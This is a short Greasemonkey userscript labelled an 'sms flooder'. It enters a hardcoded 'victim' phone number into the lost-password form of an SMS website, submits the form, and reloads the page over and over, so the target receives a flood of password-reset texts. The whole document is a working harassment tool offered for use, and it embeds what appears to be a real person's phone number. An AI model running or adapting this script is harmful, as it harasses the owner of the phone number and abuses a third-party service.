// ==UserScript==
// @name          Anonymous ZHAKKAS sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*sms.zhakkas.com/*
// ==/UserScript==

var victim=8092262928//Enter victims number here

if(document.location=="http://sms.zhakkas.com/lostpass.php"||document.location=="http://sms.zhakkas.com/lostpass.php")
{
document.forms[0].elements[0].value=victim;
document.forms[0].submit();
}
if(document.location=="http://sms.zhakkas.com/lostpass.php"||document.location=="http://sms.zhakkas.com/lostpass.php")
document.location='http://sms.zhakkas.com/lostpass.php';